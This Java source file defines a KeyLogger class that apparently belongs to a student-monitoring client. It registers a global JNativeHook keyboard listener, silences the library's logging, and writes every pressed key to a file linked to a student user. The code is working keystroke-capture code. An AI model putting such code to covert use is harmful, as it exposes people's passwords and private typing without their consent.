package logger;

import client.Student;

// imports for Native Hook
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;

// imports for log level handeling
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {

    final Student user;
    KeyLoggerFile kf;

    public KeyLogger(Student user) {
        this.user = user;
        kf = new KeyLoggerFile(user);

        try {
            // Registering Native Hook 
            GlobalScreen.registerNativeHook();
            // Getting log generated br GlobalScreen
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            // Shutting off all log for GlobalScreen
            logger.setLevel(Level.OFF);
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        // Auto invoke Listning Key methods
        GlobalScreen.addNativeKeyListener(this);
    }

    public static void main(String args[]) {

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent key) {
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent key) {
        CharSequence text = NativeKeyEvent.getKeyText(key.getKeyCode()) + "\n";
        try {
            kf.keyLoggerWriter(text); // invoke method for storing the key value into files
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent key) {
    }
}
